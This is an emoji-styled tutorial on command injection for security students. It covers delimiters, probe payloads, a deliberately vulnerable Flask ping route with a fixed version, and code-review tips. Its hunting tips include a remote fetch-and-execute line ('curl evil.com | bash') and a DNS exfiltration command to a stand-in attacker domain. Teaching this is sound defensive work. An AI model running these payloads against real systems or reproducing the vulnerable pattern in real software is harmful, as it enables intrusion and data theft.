🔥 **Ultimate Guide to Command Injection (For Cybersecurity Students)** 🔥

---

## 📌 What is Command Injection?

> Command Injection is when an attacker **injects system-level commands** into a program — typically via unsanitized input — and gets them **executed by the server's OS**.

---

## 🧠 Real-world Analogy

You're at a restaurant and ask the waiter for "Water". But what if you said:  
**"Water && burn the kitchen down"**  
And the waiter does both without questioning it? 😳  
That’s **Command Injection**.

---

## 🧬 How Does It Work?

Apps that call system commands using user input like:
```bash
ping -c 1 <user_input>
```
If input is:
```bash
127.0.0.1; ls
```
The final executed command becomes:
```bash
ping -c 1 127.0.0.1; ls
```

💥 Now `ls` is also executed — this is command injection.

---

## 🧪 BLACK-BOX TESTING (No code access)

🎯 **Goal:** Trick the system to execute OS commands.

### Step-by-step Approach:
1. **Find input points:** Forms, URL params, headers (User-Agent), cookies.
2. **Test OS command delimiters:**
   - Unix: `;`, `&&`, `|`, `` ` ``, `$( )`
   - Windows: `&`, `|`, `&&`, `||`
3. **Payloads to try:**
```bash
; whoami
&& id
| uname -a
$(id)
`id`
```
4. **Observe output:**
   - Are you getting usernames, error messages, weird behavior?
   - Did response time increase (maybe `sleep 5` worked)?

### Tools:
- `ffuf`, `dirsearch` (finding inputs)
- `burp` or `zap` (intercept and tamper requests)
- `commix` (automated command injection scanner)

---

## 🧬 WHITE-BOX TESTING (Source Code Review)

🎯 **Goal:** Review code to spot command execution using user input.

### Look for:
- **Dangerous functions:**
  - PHP: `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`
  - Python: `os.system()`, `subprocess.call()`, `subprocess.Popen()`
  - Java: `Runtime.getRuntime().exec()`
  - Node.js: `child_process.exec()`

- **Unsanitized inputs passed into those functions:**
```python
# Python vulnerable code
os.system("ping -c 1 " + user_input)
```

### Secure Version:
```python
import subprocess
@app.route("/ping")
def ping():
    ip = request.args.get("ip")
    if not ip.replace('.', '').isdigit():
        return "Invalid IP"
    result = subprocess.run(["ping", "-c", "1", ip], capture_output=True)
    return result.stdout.decode()
```

---

## 🔎 Code Review Cheatsheet

| 🔥 Red Flag                     | 💡 Suggestion           |
|-------------------------------|-------------------------|
| String concatenation in exec  | Use parameter arrays    |
| No validation on input        | Whitelist expected values |
| Uses dangerous exec functions | Replace or sandbox them |
| Output shows system info      | Sanitize or log it instead |

---

## 🧨 Vulnerable Code Example (Python)

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/ping")
def ping():
    ip = request.args.get("ip")
    return os.popen(f"ping -c 1 {ip}").read()
```

### ✅ Secure Version:
```python
import subprocess
@app.route("/ping")
def ping():
    ip = request.args.get("ip")
    if not ip.replace('.', '').isdigit():
        return "Invalid IP"
    result = subprocess.run(["ping", "-c", "1", ip], capture_output=True)
    return result.stdout.decode()
```

---

## 🧠 Memory Hack: "W-H-O-I-S"

W – What function is being used?  
H – How is input received?  
O – Output type?  
I – Is input validated?  
S – Safe alternative available?

---

## 🎯 Pro Hunting Tips

- Look beyond URL params: test **headers, cookies, POST bodies**
- Chain command injection to **RCE** (e.g., `; curl evil.com | bash`)
- Look for **blind injection** by using `sleep`, `ping`, `dnslog` tools
- If output isn't shown, try **DNS exfiltration**:
```bash
nslookup `whoami`.attacker.com
```

---

## 🧠 Final Words

Command Injection is **simple yet deadly** — it gives full control over the system if successful.

🔒 **Defense:** Validate input, use safe APIs, never trust the user.

---

📚 Keep practicing, keep testing. Master this, and you’re on your way to being elite in cybersecurity! 💻💥
